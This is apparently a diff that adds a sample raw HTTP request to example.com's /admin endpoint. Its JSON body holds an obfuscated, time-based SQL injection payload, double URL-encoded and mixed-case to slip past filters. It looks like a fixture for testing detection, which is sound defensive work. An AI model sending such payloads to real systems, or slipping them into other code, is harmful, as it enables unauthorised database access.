@@ -1,0 +1,9 @@
+POST /admin HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+Content-Type: application/json
+Content-Length: 79
+
+{"q": "'%2520CHAR(111,114)%2520slEep(5)--%3b%2520seleCt%2520NULL,%2520nuLl --"}
